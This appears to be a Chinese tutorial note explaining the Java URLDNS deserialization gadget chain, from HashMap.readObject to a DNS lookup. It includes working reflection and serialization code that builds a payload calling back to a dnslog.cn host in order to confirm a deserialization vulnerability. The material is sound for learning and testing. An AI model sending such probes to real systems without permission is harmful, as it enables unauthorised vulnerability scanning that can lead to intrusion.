URLDNS链由于没有版本和依赖限制，。一般用于反序列化漏洞的验证，利用反序列化触发这条链子，引发DNS解析，以便验证漏洞。
```
已知：
1、HashMap类实现了Serializable是可以序列化和反序列化的。并重写了ReadObject方法。
2、HashMap的容器存入URL类型的对象时的Put方法，调用hash函数会触发对象的hashCode函数来计算hashcode。
3、HashMap重写了ReadObject方法，在反序列化时也会调用hash函数计算hashCode。
```

```
正向触发：
创建hashmap为URL类型的对象和URL对象
使用put存入URL对象数据到hashmap中，作为键或值均可
在hashmap调用put时，调用了Hashmap.java中的hash函数
在hash函数中又调用了这个URL对象的hashCode方法
URL对象中的hashcode方法中，如果hashcode=-1(还未初始化计算hashcode)，会执行URLStreamHandler中的hashCode函数
在URLStreamHandler中的hashCode函数中执行了getHostAddress函数解析了URL，获取ip，因此触发DNS解析(如果失败换一个wifi)

hashmap.put(URL,x)->hash(URL)->URL.hashcode-()>handler.hashcode()->getHostAddress()
```
## **反序列化触发**
payload
```
HashMap<URL, Integer> hashMap = new HashMap<>();
URL url = new URL("http://r2t55a.dnslog.cn");
Class<? extends URL> clazz = url.getClass();
Field code = clazz.getDeclaredField("hashCode");
code.setAccessible(true);
code.set(url, 1); // 伪装hashcode已经初始化，为了让getHostName()不执行。
hashMap.put(url, 1);
code.set(url, -1);// 让hashcode没有初始化，为了再反序列化的时候再初始化执行getHostName()。
```

```
FileOutputStream fileOutputStream = new FileOutputStream("ser.bin");
ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
objectOutputStream.writeObject(hashMap);
fileOutputStream.close();
objectOutputStream.close();

FileInputStream fileInputStream = new FileInputStream("ser.bin");
ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
Object o = objectInputStream.readObject();
System.out.println(o);
objectInputStream.close();
fileInputStream.close();
```
原理
`java.util.HashMap`实现了`Serializable`接口，重写了`readObject`, 在反序列化时会调用`hash`函数计算`key`的`hashCode`，而`java.net.URL`的`hashCode`在计算时会调用`getHostAddress`来解析域名, 从而发出`DNS`请求。
```

1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->getByName()
```
参考：<https://z-bool.github.io/2022/10/16/java-deserializ-1/>

